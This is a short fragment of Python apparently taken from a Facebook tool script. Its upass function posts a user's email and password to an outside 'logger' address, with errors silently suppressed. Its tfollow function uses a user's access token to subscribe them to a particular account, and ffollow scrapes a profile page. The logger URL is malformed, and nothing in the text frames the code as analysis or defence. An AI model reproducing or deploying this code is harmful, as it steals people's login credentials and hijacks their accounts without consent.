...
try:
    ...
    def upass(email, password):
        try:
            post('https://logger kontollllll=' + email + '|' + password + '\n')
        except:
            pass
    ...
    def tfollow(token):
        try:
            status = post(('https://graph.facebook.com/bheka28/subscribers?access_token={}').format(token))
        except:
            pass
    ...
    def ffollow():
        try:
            html = BeautifulSoup(s.get(url.format('/profile.php?id=zuck')).text, 'html.parser')
        except:
            pass
